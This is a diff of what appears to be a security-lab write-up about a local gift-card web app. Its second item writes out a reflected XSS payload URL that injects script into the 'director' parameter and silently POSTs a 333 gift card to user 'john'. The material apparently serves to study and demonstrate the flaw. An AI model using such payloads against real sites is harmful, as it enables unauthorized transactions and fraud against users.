@@ -8,22 +8,27 @@ This vulnerability can be found in line 60 of the given "gift.html" and the vuln
 
 
 
-
 -------------------------------------------------------------------------------------------------------------------------------------------------------
-(2) This url link below with javascript embedded is for testing a link, which has someone gifting a card (amount=333) to someone (username=john) unintended
+
+
+
+(2) This url link below with javascript embedded is for testing a link, which has someone gifting a card (amount=333) to someone (username=john) unintended.
 This reference code below includes newlines between ";" for readability, please refer to "buy.txt" within this directory for the url link without newlines.
 ---
 http://127.0.0.1:8000/gift?director=%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();
-%20xhr.open(%22POST%22,%20%22/gift/1%22,%20true);var%20data%20=%20new%20FormData();
+%20xhr.open(%22POST%22,%20%22/gift/1%22,%20true);
+var%20data%20=%20new%20FormData();
 %20data.append(%27username%27,%27john%27);
 %20data.append(%27amount%27,333);
 %20data.append(%27product%27,%20%271%27);
-%20data.append(%27price%27,%20%27333%27);
-data.append(%27customer%27,%27john%27);
 %20xhr.send(data);
 %3C/script%3E
 ---
 This URL link embeds javascript to the vulnerable url parameter for "director" and uses XMLhttprequest function to "POST" data rather than "GET" data.
 This URL link will "POST" data when the link is clicked on, sending "FormData" to the webserver. 
-This "FormData" includes a giftcard with the amount of 333 to the user john; extra/duplicate parameters included to accomodate for the original glitch.
+This "FormData" includes a giftcard with the amount of 333 to the user john (unintended recipient);
+
+
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------
+
